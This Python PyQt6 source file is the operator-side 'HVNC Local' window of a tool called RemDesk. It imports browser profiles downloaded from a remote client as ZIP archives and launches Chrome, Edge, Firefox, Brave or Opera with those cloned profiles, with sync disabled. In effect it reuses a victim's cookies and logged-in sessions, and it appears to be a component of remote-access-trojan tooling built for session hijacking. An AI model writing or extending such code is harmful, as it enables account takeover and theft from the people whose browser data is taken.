"""Local Desktop Window for Operator.

Creates a local workspace where the operator can:
- Launch browsers with profiles downloaded from client
- View the client's screen in one panel
- Work locally with cloned session data

This is the "HVNC Local" mode implementation.
"""
from __future__ import annotations

import base64
import json
import logging
import os
import platform
import shutil
import subprocess
import tempfile
import zipfile
from pathlib import Path
from typing import Callable

from PyQt6 import QtCore, QtGui, QtWidgets

logger = logging.getLogger(__name__)


class LocalBrowserManager:
    """Manages local browser instances with imported profiles."""
    
    # Browser executable paths
    BROWSER_PATHS = {
        "chrome": [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            "/usr/bin/google-chrome",
            "/usr/bin/chromium-browser",
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        ],
        "edge": [
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        ],
        "firefox": [
            r"C:\Program Files\Mozilla Firefox\firefox.exe",
            r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
            "/usr/bin/firefox",
            "/Applications/Firefox.app/Contents/MacOS/firefox",
        ],
        "brave": [
            r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
            r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
        ],
        "opera": [
            r"C:\Program Files\Opera\opera.exe",
            r"C:\Program Files (x86)\Opera\opera.exe",
        ],
    }
    
    def __init__(self):
        self._profile_dir = Path(tempfile.mkdtemp(prefix="remdesk_profiles_"))
        self._imported_profiles: dict[str, Path] = {}
        self._running_browsers: list[subprocess.Popen] = []
        self._is_windows = platform.system() == "Windows"
        
        logger.info("LocalBrowserManager initialized, profile dir: %s", self._profile_dir)
    
    def find_browser_exe(self, browser: str) -> str | None:
        """Find browser executable path."""
        paths = self.BROWSER_PATHS.get(browser.lower(), [])
        for path in paths:
            if os.path.exists(path):
                return path
        return None
    
    def import_profile(self, browser: str, zip_data: bytes) -> bool:
        """Import browser profile from ZIP data.
        
        Args:
            browser: Browser name
            zip_data: ZIP file contents
            
        Returns:
            True if import successful
        """
        try:
            profile_path = self._profile_dir / browser
            if profile_path.exists():
                shutil.rmtree(profile_path)
            profile_path.mkdir(parents=True)
            
            # Extract ZIP
            import io
            with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zf:
                zf.extractall(profile_path)
            
            self._imported_profiles[browser] = profile_path
            logger.info("Imported %s profile to %s", browser, profile_path)
            return True
            
        except Exception as e:
            logger.error("Failed to import %s profile: %s", browser, e)
            return False
    
    def import_profile_from_file(self, browser: str, zip_path: str) -> bool:
        """Import profile from ZIP file path."""
        try:
            with open(zip_path, 'rb') as f:
                return self.import_profile(browser, f.read())
        except Exception as e:
            logger.error("Failed to read profile ZIP: %s", e)
            return False
    
    def launch_browser(self, browser: str, url: str = None) -> subprocess.Popen | None:
        """Launch browser with imported profile.
        
        Args:
            browser: Browser name
            url: Optional URL to open
            
        Returns:
            Popen object or None
        """
        exe_path = self.find_browser_exe(browser)
        if not exe_path:
            logger.error("Browser %s not found", browser)
            return None
        
        profile_path = self._imported_profiles.get(browser)
        if not profile_path:
            logger.warning("No imported profile for %s, launching with default", browser)
            profile_path = self._profile_dir / f"{browser}_temp"
            profile_path.mkdir(parents=True, exist_ok=True)
        
        # Build command
        browser_lower = browser.lower()
        cmd = [exe_path]
        
        if browser_lower in ("chrome", "edge", "brave", "opera"):
            # Chromium-based
            cmd.extend([
                f"--user-data-dir={profile_path}",
                "--no-first-run",
                "--no-default-browser-check",
                "--disable-sync",
            ])
        elif browser_lower == "firefox":
            # Firefox
            cmd.extend([
                "-profile", str(profile_path),
                "-no-remote",
            ])
        
        if url:
            cmd.append(url)
        
        try:
            if self._is_windows:
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                proc = subprocess.Popen(cmd, startupinfo=startupinfo)
            else:
                proc = subprocess.Popen(cmd)
            
            self._running_browsers.append(proc)
            logger.info("Launched %s with profile %s", browser, profile_path)
            return proc
            
        except Exception as e:
            logger.error("Failed to launch %s: %s", browser, e)
            return None
    
    def get_imported_browsers(self) -> list[str]:
        """Get list of browsers with imported profiles."""
        return list(self._imported_profiles.keys())
    
    def close_all_browsers(self):
        """Close all running browser instances."""
        for proc in self._running_browsers:
            try:
                proc.terminate()
            except Exception:
                pass
        self._running_browsers.clear()
    
    def cleanup(self):
        """Cleanup all resources."""
        self.close_all_browsers()
        try:
            shutil.rmtree(self._profile_dir, ignore_errors=True)
        except Exception:
            pass


class LocalDesktopWindow(QtWidgets.QMainWindow):
    """Local desktop window for operator.
    
    Provides a workspace for launching browsers with client profiles.
    """
    
    closed = QtCore.pyqtSignal()
    
    def __init__(self, parent=None):
        super().__init__(parent)
        
        self.browser_manager = LocalBrowserManager()
        self._pending_profile_data: dict[str, bytes] = {}
        
        self.setWindowTitle("Local Desktop - RemDesk")
        self.setMinimumSize(600, 400)
        self.resize(800, 600)
        
        self._setup_ui()
    
    def _setup_ui(self):
        """Setup the UI."""
        central = QtWidgets.QWidget()
        self.setCentralWidget(central)
        
        layout = QtWidgets.QVBoxLayout(central)
        layout.setSpacing(12)
        layout.setContentsMargins(16, 16, 16, 16)
        
        # Header
        header = QtWidgets.QLabel("Local Desktop")
        header.setStyleSheet("font-size: 18px; font-weight: bold; color: #0af;")
        layout.addWidget(header)
        
        # Description
        desc = QtWidgets.QLabel(
            "Launch browsers locally with profiles downloaded from the client.\n"
            "Use 'Browser Profiles' to download profiles first."
        )
        desc.setStyleSheet("color: #888;")
        desc.setWordWrap(True)
        layout.addWidget(desc)
        
        # Separator
        line = QtWidgets.QFrame()
        line.setFrameShape(QtWidgets.QFrame.Shape.HLine)
        line.setStyleSheet("background-color: #333;")
        layout.addWidget(line)
        
        # Import section
        import_group = QtWidgets.QGroupBox("Import Profile")
        import_layout = QtWidgets.QHBoxLayout(import_group)
        
        self.import_btn = QtWidgets.QPushButton("Import Profile ZIP...")
        self.import_btn.clicked.connect(self._on_import_profile)
        import_layout.addWidget(self.import_btn)
        
        self.import_status = QtWidgets.QLabel("")
        self.import_status.setStyleSheet("color: #888;")
        import_layout.addWidget(self.import_status, 1)
        
        layout.addWidget(import_group)
        
        # Browsers section
        browsers_group = QtWidgets.QGroupBox("Launch Browser")
        browsers_layout = QtWidgets.QGridLayout(browsers_group)
        
        self.browser_buttons = {}
        browsers = [
            ("chrome", "Chrome", "🌐"),
            ("edge", "Edge", "🌐"),
            ("firefox", "Firefox", "🦊"),
            ("brave", "Brave", "🦁"),
            ("opera", "Opera", "🎭"),
        ]
        
        for i, (browser_id, name, icon) in enumerate(browsers):
            btn = QtWidgets.QPushButton(f"{icon} {name}")
            btn.setMinimumHeight(40)
            btn.setEnabled(False)  # Disabled until profile imported
            btn.clicked.connect(lambda checked, b=browser_id: self._on_launch_browser(b))
            self.browser_buttons[browser_id] = btn
            browsers_layout.addWidget(btn, i // 3, i % 3)
        
        layout.addWidget(browsers_group)
        
        # URL input
        url_layout = QtWidgets.QHBoxLayout()
        url_layout.addWidget(QtWidgets.QLabel("URL:"))
        self.url_input = QtWidgets.QLineEdit()
        self.url_input.setPlaceholderText("https://example.com")
        url_layout.addWidget(self.url_input, 1)
        layout.addLayout(url_layout)
        
        # Status
        self.status_label = QtWidgets.QLabel("Import a browser profile to get started")
        self.status_label.setStyleSheet("color: #666; padding: 8px;")
        layout.addWidget(self.status_label)
        
        layout.addStretch()
        
        # Footer
        footer_layout = QtWidgets.QHBoxLayout()
        
        self.close_browsers_btn = QtWidgets.QPushButton("Close All Browsers")
        self.close_browsers_btn.clicked.connect(self._on_close_browsers)
        footer_layout.addWidget(self.close_browsers_btn)
        
        footer_layout.addStretch()
        
        close_btn = QtWidgets.QPushButton("Close Window")
        close_btn.clicked.connect(self.close)
        footer_layout.addWidget(close_btn)
        
        layout.addLayout(footer_layout)
        
        # Apply dark theme
        self.setStyleSheet("""
            QMainWindow, QWidget {
                background-color: #1e1e1e;
                color: #ddd;
            }
            QGroupBox {
                border: 1px solid #333;
                border-radius: 6px;
                margin-top: 12px;
                padding-top: 12px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 4px;
            }
            QPushButton {
                background-color: #333;
                border: 1px solid #444;
                border-radius: 4px;
                padding: 8px 16px;
                color: #ddd;
            }
            QPushButton:hover {
                background-color: #444;
            }
            QPushButton:disabled {
                background-color: #2a2a2a;
                color: #666;
            }
            QLineEdit {
                background-color: #2a2a2a;
                border: 1px solid #444;
                border-radius: 4px;
                padding: 6px;
                color: #ddd;
            }
        """)
    
    def _on_import_profile(self):
        """Handle import profile button click."""
        file_path, _ = QtWidgets.QFileDialog.getOpenFileName(
            self,
            "Import Browser Profile",
            "",
            "ZIP files (*.zip);;All files (*.*)"
        )
        
        if not file_path:
            return
        
        try:
            # Try to read metadata from ZIP
            with zipfile.ZipFile(file_path, 'r') as zf:
                if "_profile_metadata.json" in zf.namelist():
                    metadata = json.loads(zf.read("_profile_metadata.json"))
                    browser = metadata.get("browser", "unknown")
                else:
                    # Try to guess from filename
                    filename = os.path.basename(file_path).lower()
                    browser = "unknown"
                    for b in ["chrome", "edge", "firefox", "brave", "opera"]:
                        if b in filename:
                            browser = b
                            break
            
            # Import profile
            if self.browser_manager.import_profile_from_file(browser, file_path):
                self._update_browser_buttons()
                self.import_status.setText(f"✓ Imported {browser} profile")
                self.import_status.setStyleSheet("color: #0f0;")
                self.status_label.setText(f"Ready to launch {browser}")
            else:
                self.import_status.setText("Import failed")
                self.import_status.setStyleSheet("color: #f55;")
                
        except Exception as e:
            self.import_status.setText(f"Error: {e}")
            self.import_status.setStyleSheet("color: #f55;")
            logger.error("Import error: %s", e)
    
    def _on_launch_browser(self, browser: str):
        """Handle launch browser button click."""
        url = self.url_input.text().strip() or None
        proc = self.browser_manager.launch_browser(browser, url)
        
        if proc:
            self.status_label.setText(f"Launched {browser}" + (f" with {url}" if url else ""))
            self.status_label.setStyleSheet("color: #0f0;")
        else:
            self.status_label.setText(f"Failed to launch {browser}")
            self.status_label.setStyleSheet("color: #f55;")
    
    def _on_close_browsers(self):
        """Handle close all browsers button."""
        self.browser_manager.close_all_browsers()
        self.status_label.setText("Closed all browsers")
    
    def _update_browser_buttons(self):
        """Update browser button states based on imported profiles."""
        imported = self.browser_manager.get_imported_browsers()
        
        for browser, btn in self.browser_buttons.items():
            if browser in imported:
                btn.setEnabled(True)
                btn.setStyleSheet("background-color: #0066cc;")
            else:
                # Enable anyway but without profile
                btn.setEnabled(True)
    
    def import_profile_data(self, browser: str, data: bytes):
        """Import profile from raw data (called from remote session)."""
        if self.browser_manager.import_profile(browser, data):
            self._update_browser_buttons()
            self.status_label.setText(f"Imported {browser} profile from client")
            self.status_label.setStyleSheet("color: #0f0;")
    
    def closeEvent(self, event: QtGui.QCloseEvent):
        """Handle window close."""
        self.browser_manager.cleanup()
        self.closed.emit()
        super().closeEvent(event)


def create_local_desktop() -> LocalDesktopWindow:
    """Create and return a local desktop window."""
    return LocalDesktopWindow()
